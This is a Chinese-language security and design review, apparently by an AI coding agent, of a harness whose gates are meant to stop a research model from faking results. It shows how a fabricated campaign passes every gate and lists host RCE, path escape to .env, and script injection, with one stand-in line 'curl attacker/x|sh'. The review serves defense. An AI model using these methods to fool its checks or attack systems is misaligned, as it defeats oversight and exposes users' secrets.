# 实施代码评审 · Research Minimal Core + Track B

**范围**：`7641043^..9dc777c`（五个提交）· 评审日 2026-08-22
**方法**：我自己通读 + 四路独立子代理（Python 侧 / TypeScript 侧 / 安全隔离 / Grok 复审）
+ 一路架构差距分析。所有 CRITICAL 级结论都有**可复现的实证**，不是读码推测。
**权威口径**：`docs/plans/2026-08-22-research-min-core.md`。Fable5.md / PrimeAgent.md
是愿景文档，不构成范围。

---

## 一句话结论

生成侧（skill、状态机、容器、Track B）是完整且能跑的；**执法侧不成立**。
三路评审各自独立地发现了同一件事：

> **一场完全捏造的战役——实验从未执行、register.json 手工改过、报告里的数字是编的——
> 原样通过三道 gate。**

这不是"某处有个 bug"，这是这套系统唯一的卖点失效。计划 §1 写的是"模型可以在
kernel 里撒谎，但它骗不过 gate"；实测是它骗得过。Step 0 七次"差一步全绿"里，
**没有一次的失败原因是模型能力**，全部是宿主侧缺陷——其中两条还是互相矛盾的规则，
数学上无解。

本轮已修 14 项并补了 9 个测试（56 passed）。**剩下 3 项需要你做决定**，见 §4。

---

## 1 · 现场证据

### 1.1 捏造的战役通过所有 gate（Python 侧评审复现，我已独立验证）

手写 `provenance.json` + `raw/m.json`，把 `register.json` 里的 claim 直接改成 SUPPORTED，
报告写 0.97：

```
修复前： prereg PASS   reconcile PASS   review PASS      ← 三道全绿
修复后： integrity FAIL prereg PASS   reconcile PASS   review PASS
```

`land()` 不是关口，是**约定**：`mark_running(pid)` 加五个手写 JSON 字段就能完整复现它。
没有任何一道 gate 拿 `journal.jsonl` 去核对 `register.json`——而 journal 正是唯一的过程记录。

### 1.2 toy-7 停在一个数学上无解的位置

评审时 toy-7 仍在运行。我对它重跑四道 gate：

```
GATE prereg: PASS
GATE reconcile: FAIL
  ✗ H3 被报告引用但没有任何 artifact
  ✗ 幻觉数字：报告称 0.6 (P#=P2)，重算 0.646493
  ✗ 幻觉数字：报告称 1.0 (P#=P2)，重算 0.646493
GATE review: PASS
```

journal 停在同一条拒绝上重复两次：`{"op":"land","ok":false,"reason":"未知 claim: H"}`。
这三条 FAIL 加两条 land 拒绝，**全部**是宿主侧缺陷（F1/F2/F3）。我确认它无论再跑多久
都不可能变绿，于是停掉了它（`bound` 记为 `signal-15`，见 F7）。

---

## 2 · CRITICAL（已修）

### F0 · register 与 journal 从不对账 —— 执法层缺失

三道 gate 都把 `register.json` 当事实读。它是模型写的一个普通文件。改 `claims.H2.state`
为 SUPPORTED、往某个已落地 probe 的 `result.applied.support` 里塞一个 `"H2"`，三道全绿。

**已修**：新增第四道 `gates/integrity.py`（约 100 行，只用标准库）。它拿只追加的 journal
复算一遍，拒绝：终态 claim 没有 `killed_by`／`killed_by` 指向的 probe 不是 LANDED／journal
里没有对应 `land ok=true` 且 applied 点名它／claim 没有 abduce 记录／register 指标与
journal 记录不一致／同一 probe 出现两条 land（日志被追写）／**空跑**（没有任何 LANDED
probe 或没有任何 claim 走到终态——三道 gate 原本在空 register 上全部 PASS，因为每条
检查都是对空集合的循环）。

已接进 `run.sh` 与 `entrypoint.sh`，四道 gate 现在都跑。

### F1 · review 与 reconcile 互相矛盾，报告无解

`review.py` 要求 register 中**每个** claim 有 verdict 行；`reconcile.py` 拒绝报告中
**任何**没有 artifact 的 `H#`。只要存在一个还没跑 probe 的 LIVE claim——而 grill 派生新假设
时必然产生一个，goal 第 3 步又明确要求发起 grill——模型就被夹死：写它被 reconcile 拒，
不写它被 review 拒。**不存在能同时通过的报告文本。**

而 `loop/SKILL.md:58` 正是命令模型"register 中每个 claim 恰好一行"。模型照做，然后被
另一道 gate 判负。这属于 [[impossible-instructions-class]]：看着像模型不服从，其实是
规则集自相矛盾。

**已修**：reconcile 做 claim 引用检查前剔除 verdict 行（`- H1: SUPPORTED` 这种整行），
它的语义是枚举 register 状态，不是证据性断言。注意**只豁免 verdict 行本身**，不豁免整个
「## 评审」段——段落切分会一路吃到文末，把后面的散文一起放行（我第一版就是这么写的，
被新加的测试当场抓住）。

### F2 · `on_hit` 写成字符串 → probe 永久卡死

toy-7 的 P1 里模型写的是 `{"support": "H1", "kill": "H2"}`（字符串），而 P2 写的是列表——
同一次运行里两种都写。prereg 只校验 on_hit 的**键**，不校验值类型；到 land 时字符串被
逐字符迭代，第一个字符 `"H"` 进 `_require_claim("H")` → `未知 claim: H`。probe 永远停在
RUNNING，`stale()` 永远欠账，模型只能反复重试同一个必败调用。已本地复现。

**已修**：prereg 阶段规范化（标量提升为单元素列表）并当场校验 target 存在。在预登记处
拒绝比在落地处崩溃好得多——错误发生在模型还记得上下文的时候。

### F3 · land() 被拒时半途写入，脏状态会漏到磁盘

on_hit 有多个 target 时逐个改内存，第 k 个触发拒绝则前 k-1 个已被改；`_save()` 在循环之后
所以磁盘没变，但 `_reload_if_stale` 靠 mtime 判断，mtime 没变**就不会重读**。下一次任何
成功操作的 `_save()` 把脏状态一并落盘。已复现：

```
land refused: H3 已终态（REFUTED）...
IN-MEMORY h2 = REFUTED
ON-DISK   h2 = LIVE
ON-DISK after next op h2 = REFUTED   ← 泄漏
```

后果正是这套系统要防的那件事：**claim 变成 REFUTED，journal 里没有对应条目，杀死它的
probe 停在 RUNNING 从未 LANDED**。

**已修**：两阶段落地（先解析校验出完整待应用表，全部合法才写第一个字节）+ 拒绝路径上
`_rollback()` 从磁盘重读 + 非 RefusalError 异常也留痕再抛（原先只 catch RefusalError，
`IndexError` 之类直接静默逃逸）。F0 的 integrity gate 是能自动发现此类漏洞的机械手段。

### F4 · 宿主 gate 执行模型写的 Python（RCE）

`gates/common.py` 的 `kind:"python"` 分支 `subprocess.run([sys.executable, "-c", spec["source"]])`。
而 `campaign/run.sh` 在**宿主**上跑 gate。链路全部活着：模型写 `prereg/P*.json` → 宿主
reconcile 读它 → 执行。拿到的是 `lingxufeng` 权限、家目录读写（含 `.env`）、以及**全部
loopback 服务**（:4004 / :4001 / :5174）——红线 4 的唯一防线是容器网络到不了 loopback，
而这条路径根本就在宿主上跑。触发条件就是一次正常成功的运行。

同族：`kind:"regex"` 的 `file` 未做路径约束，`../../../ClawUI/.env` 可读，且 `float()` 失败时
**文件内容原样写进 `$ART/gate-reconcile.host.log`**——也就是写进 artifacts、写进快照 tar、
写进运维终端。评审用诱饵文件实证过。而 `run.sh` 重跑同一 RUN_ID 时不清目录，会把上一轮
含密钥的 gate 日志重新挂回容器里给模型看。

**已修**：宿主 gate 一律拒绝 `kind:"python"`（裁决层不执行模型代码；容器内同名 gate 保留，
那里本来就是沙箱）；新增 `confined()` 把所有模型给的路径钉死在 run 目录内；报错文本不再
回显文件内容与模型给的 pattern；regex 输入限 1 MiB（顺带挡掉 ReDoS）。

### F5 · Track B 的 autonomous IPC 是一条无人使用的任意命令通道

`ipc.ts:2261` 的 `UPDATE_SESSION_AUTONOMOUS` 把 renderer 传来的对象**原样落盘**，没有任何
校验。`config.gates` 进 Prime 后以 `shell: true`、宿主 cwd、无沙箱执行。渲染进程里任何一处
脚本注入即可 `updateSessionAutonomous(id, {enabled:true, gates:['curl attacker/x|sh']})`，
写进会话索引、重启后仍在、该会话每次 autonomous 收尾都执行。

我核实了它的两个前提：`grep` 确认渲染层与 `research/` **零调用者**；handler 确实没有任何
类型检查。也就是说这是一个没有消费者、纯增攻击面的功能。

**未修——等你决定**，见 §4.3。

---

## 3 · HIGH / MEDIUM（已修部分）

| # | 问题 | 状态 |
|---|---|---|
| F6 | 频段豁免与出处核对彼此不一致：模型写 `[0.60 (P2), 1.00 (P2)]` 后，一条规则说这些是预登记内容、另一条说是结果数字判为幻觉 | **已修**（频段内的 (P#) 不计入对账）+ SKILL 补了"频段里别标出处" |
| F7 | `BAND_EXPR` 宽到任意方括号：`最终准确率 [0.91]` 完全免检——给"我不想解释的数字"开了后门 | **已修**（严格两数值 `[lo, hi]`） |
| F8 | 零小数位引用买到 ±0.5 容差：真值 0.6465 时 `约 1 (P1)` 通过 | **已修**（半宽上限取指标量级 1%） |
| F9 | `\bH\d+\b` 在中文里没有词边界，`假设H99的分析` 整条漏掉；review 用的又是另一个模式 | **已修**（两边统一 `H\d+`） |
| F10 | which-bound-ended 把"被人停掉"（SIGTERM=143）记成 `gates-failed`；`limit-exhausted` 靠 grep 模型自己的 stdout 判定——模型在总结里打印 "tokens" 就能把判负洗成额度耗尽（toy-6 已**真实误判**过） | **已修**（信号单列 + 不再 grep 模型输出） |
| F11 | `/work/case` 可写：模型可写 `.git/config` 的 `fsmonitor` 或 `hooks/`，下一次宿主侧 git 操作即代它执行代码 | **已修**（挂 `:ro` + probe 改用 `git clone`，clone 不复制 config/hooks） |
| F12 | viewer 把模型写的 `metric` 与 `band` 未转义注入评委看的 HTML（实证 `<script>` 可执行）；gate 徽章靠 substring 匹配日志判定，模型让 "PASS" 出现在拒因里徽章就变绿；`figures/` 里的符号链接可把宿主任意文件 base64 内联进页面 | **已修**（`esc()` + 裁决只认 ledger.json + realpath 限定 + 体积上限） |
| F13 | probe 重跑必崩：`shutil.rmtree` 不 prune worktree，`git worktree add -b` 因分支已存在抛错——唯一的崩溃恢复路径被堵死，逼模型转向手工造结果 | **已修**（改 clone，可重入） |
| F14 | land 忽略 `provenance.exit_code`：崩溃/被杀的运行照样落地，半截 `metrics.json` 与干净结果不可区分 | **已修**（非零退出拒绝落地） |
| F15 | 已落地的 probe 可以重跑并覆写 `raw/`，register 留着旧指标，gate 从新文件重算 → 两者永久不一致 | **已修**（probe.run 只接受 PREREG/RUNNING） |
| F16 | TRIAGE 的欠条永不清除，30 分钟一次的 heartbeat 会在整场战役里反复催同一笔已还的账 | **已修**（`R.settle_owed(source, why)`） |
| F17 | 长程运行没有轨迹：print 模式只在结束时输出，实测 container.log 分别是 234 B / 942 B / 113 B。一次 90 分钟上百轮的战役事后只剩几百字节收尾发言；`check.sh` 的 `log_size > 20000` 判据实际上永远不成立（一直靠另半边通过） | **未修**，见 §4.2 |
| F18 | `check.sh` 的 `set -e` 让第一条不达标判据直接终止脚本，四项永远只跑到第一个 ✗，总计从不打印——历次红色 Step 0 的验收报告都是误导性的空输出 | **已修** |

---

## 4 · 需要你决定的三件事

### 4.1 执法层的天花板（架构决策）

integrity gate 把伪造成本从"改 5 个 JSON 字段"提到"同时伪造 journal + register + provenance +
raw 且互相自洽"。但**在容器里一切都是模型可写的**，包括 journal。真正不可伪造只有两条路：

- **(a) 记录之记录移出模型写权限**：artifacts 挂只读，register/journal 经一个容器外的小
  写入服务落盘（约 1 天）；
- **(b) 宿主复算执行**：宿主在一次性沙箱里重跑 `eval_cmd` 并比对指标（约 1 天，且要求
  case 可在无网络下重跑）。

我的建议是 **(b)**——它把"recompute-not-trust"从"重算指标"推进到"重算执行"，正好是
这套系统的中心思想，而且它产出的是评委能自己复现的东西。但这是**你的取舍**：它给
每次落地增加一次完整 eval 的成本。

### 4.2 长程可观测性（便宜，但要改挂载）

Prime 自己把逐轮轨迹写在容器内 `/tmp/prime-home/.prime/agent/session-artifacts/<sid>/`，
容器一退就没了。把它挂到 `$ART/session/` 是零代码改动，直接拿到逐轮 JSONL——**这也正是
P13–P17 证据链需要的原材料**。我没动，因为它改的是运行时挂载布局，且会显著增大
artifacts 体积。建议做。

### 4.3 Track B 在战役期间的去留

TypeScript 侧评审的裁决是"不要在战役期间开着"。理由站得住：`campaign/run.sh` 直接在
Docker 里驱动 Prime，**从不经过 Electron 外壳**，所以 Track B 对战役零贡献，却带来
F5 的攻击面。另外它还发现两处"功能其实没在跑"：

- **会话驻留在默认运行时里是空转**：默认走 utility adapter，每条消息 fork 一个进程并在
  收尾 `process.exit(0)`，常驻会话在单条消息内建了又销——auto-refine 跨消息累计的收益
  没有发生。需要 `PROMA_AGENT_RUNTIME=in-process` 才成立。
- **refine 徽章读的文件 Prime 从不写**：Proma 调的是 local scope，而 `refinements.jsonl`
  只在 global scope 下写。徽章会永远显示"尚无经验记录"——**这比没有徽章更糟**，因为
  它会被读成"提炼没在触发"的证据。

建议：战役期间关掉 Track B（或至少删掉 F5 的两个 IPC handler），赛后按"删 IPC → 修徽章
数据源 → 修 refine 占用 → 再决定驻留"的顺序分片重来，每片带测试。

---

## 5 · 测试补强

原有 10 个 gate 测试**每个只跑一道 gate**，且都基于所有 claim 都有 artifact 的 fixture ——
所以 F1 的死锁从未被触发。这就是"为什么缺陷能出厂"的直接答案。

本轮新增 9 个测试（现 56 passed / 1 skipped）：

- **四道 gate 对同一份含未检验 LIVE claim 的报告同时全绿**（F1 的回归锁）
- 手改 register 被 integrity 抓住；空跑不予通过
- `[0.91]` 不再免检；`约 1 (P1)` 降精度被拒；`据H99的分析` 中文无词边界被抓
- 宿主 gate 拒绝 `kind:python`；路径逃逸被拒
- **双份 recompute 实现的等价性测试**（`common.recompute_metric` vs `register.run_spec`，
  json 与 regex 两种 kind）——"改一处必须同步另一处"原先只是注释里的愿望

仍缺、建议补：并发/多实例交错、`kind:python` 在容器内的路径、`check.sh` 自身的测试。

---

## 6 · 架构差距（对照权威计划）

**计划里承诺但没建**（差距分析独立得出，与上面互相印证）：

1. gate 从不 replay journal（= F0，**已修**）
2. gate 在空战役上全部通过（**已修**）
3. eval 按**命令字符串**冻结而非内容：改 `eval.py` 再提交，所有哈希照旧匹配。
   `_confined` 与 `:ro` 挡住了改写路径，但"内容冻结"仍未实现——建议 prereg 时记
   case 的 `git rev-parse HEAD`，land 时比对（约半天）
4. CONTESTED 没有证据下限，完全凭模型自觉写不写 `contest` 分支
5. 红→绿阳性对照只存在于单元测试，**artifacts 里没有一次真实的 red→green 事件**——
   而这是计划自己定的"头号交付物"。这是最便宜的一项（约 2 小时），也是提交材料里最可引用的一张图

**建成但超出计划**：`loop/references/` 17 个文件 131 KB —— 数量正是计划自己写的数字，
不算范围蔓延；但其中约 40% 是容器**执行不了**的指令（ChatGPT ×30、browser ×31、
Playwright ×14），而 `SKILL.md` 第 49 行**明确路由**模型去读其中两个。又是
impossible-instructions 那一类。建议删 `browser-patterns.md`，其余标注或剥离。

**从 Fable5/PrimeAgent 值得晋级的**：只有一项过线——**按 claim kind 的接受谓词**
（register 在 land 前检查该类假设必需的对照是否在 prereg 里点名）。现在 `controls`
只要非空字符串就过，这一项把它变成真正的拒绝，约 1 天。其余（判别力排序、校准账本、
陷阱世界、ARFT 判官、消融梯队、保留对手、三臂并行）要么计划 §5 已明确砍掉、要么测的是
系统本身而非这场战役、要么只在多场战役间才有回报——**一律 DEFER/REJECT**。

---

## 7 · 裁决

| 维度 | 裁决 |
|---|---|
| 架构 | 正确。单写者 + 四验证器 + 重算不采信 + 宿主裁决，方向没问题 |
| 生成侧实现 | 可用。skill/状态机/容器/viewer 都真的在跑 |
| 执法侧实现 | **本轮修复前不成立**；修复后从"约定"变成"有牙齿但仍在容器信任域内" |
| 长程可靠性 | 未验证。从没有一次运行越过 turn 30 或经历过 compaction |
| 安全隔离 | 修掉宿主 RCE 与路径逃逸后可接受；**容器出网与密钥仍是敞的**（见下） |
| 竞赛可用性 | 修复后可以开始 Step 2；但 §4.1 的决定会影响 P20 的说法能有多强 |

**两条我没动、但你应该知道的红线现状**：容器是普通 bridge 网络（**完全的公网出口**，
计划 §1 写的 ":4004 网关 only" 从未实现），且 `DASHSCOPE_API_KEY` 在容器环境变量里，
模型的 ipython 一行 `os.environ` 就能读到。两者叠加 = 一行代码把生产密钥发出去。
修法是同一件事：把 litellm :4004 放到一个专用 docker 网络，容器只连它、拿的是每轮
可撤销的网关 token。这需要动网络架构，且你有"不得改 :4001 共享 litellm"的红线，
所以我留给你决定。
